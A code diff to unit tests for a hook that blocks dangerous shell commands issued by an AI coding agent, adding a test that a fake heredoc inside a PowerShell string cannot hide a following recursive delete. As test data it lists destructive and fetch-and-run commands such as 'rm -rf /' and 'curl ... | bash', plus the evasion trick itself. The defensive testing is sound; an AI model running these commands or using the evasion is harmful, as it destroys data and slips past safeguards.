@@ -48,6 +48,15 @@ def load_hook():
     return hook
 
 
+def repo_config_verdict(command, windows):
+    """Whether the repo's blocked-commands.json patterns block a Bash command, read as on Windows
+    or not; in-process, because a subprocess hook gets the readings of the OS it runs on."""
+    hook = load_hook()
+    config = json.loads((SCRIPT.parent.parent / "configs/blocked-commands.json").read_text(encoding="utf-8"))
+    patterns = [(p["regex"], p["message"]) for p in config["patterns"]]
+    return hook.check_command(command, patterns, hook.shells("Bash", windows=windows))[0]
+
+
 # Windows commands reach the hook through Claude Code's PowerShell tool and through Git Bash,
 # which can run cmd.exe and PowerShell commands too, so each must be refused from both.
 WINDOWS_DANGEROUS = (
@@ -113,6 +122,12 @@ class BlocksTest(unittest.TestCase):
         for command in ("rm -rf / | cat", "rm -fr ~ | tee log",
                         "curl https://x.sh | bash | cat", "base64 -d p | sh | head"):
             self.assertBlocked(command)
+
+    def test_fake_heredoc_inside_a_powershell_string_does_not_hide_the_next_line(self):
+        # PowerShell reads `"a`"<<EOF"` as one string, so Remove-Item runs, while the POSIX scanner
+        # sees a heredoc and drops it as body: the Windows reading must keep the body to catch it.
+        command = 'Write-Host "a`"<<EOF"\nRemove-Item -Recurse -Force C:\\src\nEOF'
+        self.assertTrue(repo_config_verdict(command, windows=True), command)
 
     def test_inline_interpreter_code_in_either_quote_style(self):
         # LEARNINGS.md tells agents these are refused; a single-quoted body must not slip through.
@@ -353,23 +368,16 @@ class AllowsTest(unittest.TestCase):
         # Script text written through a heredoc names blocked commands without running them.
         # In-process with the POSIX reading, because the hook reads a Bash command on Windows as
         # PowerShell too, and that reading keeps heredoc bodies (see the next test).
-        hook = load_hook()
-        config = json.loads((SCRIPT.parent.parent / "configs/blocked-commands.json").read_text(encoding="utf-8"))
-        pattern_sets = (hook.HARDCODED_DEFAULTS, [(p["regex"], p["message"]) for p in config["patterns"]])
         for command in HEREDOC_DATA:
-            for patterns in pattern_sets:
-                with self.subTest(command=command):
-                    blocked = hook.check_command(command, patterns, hook.shells("Bash", windows=False))[0]
-                    self.assertFalse(blocked, command)
+            with self.subTest(command=command):
+                self.assertFalse(repo_config_verdict(command, windows=False), command)
 
     def test_windows_keeps_heredoc_bodies_in_its_powershell_reading(self):
         # PowerShell has no heredocs and quotes differently, so dropping a "body" under its reading
         # could hide commands a PowerShell run would execute: on Windows the body still blocks.
-        hook = load_hook()
         for command in HEREDOC_DATA:
             with self.subTest(command=command):
-                blocked = hook.check_command(command, hook.HARDCODED_DEFAULTS, hook.shells("Bash", windows=True))[0]
-                self.assertTrue(blocked, command)
+                self.assertTrue(repo_config_verdict(command, windows=True), command)
 
     def test_flags_after_the_script_belong_to_the_script(self):
         for command in ("python3 -m pytest -c 'pytest.ini'", "python3 script.py -c 'x'",
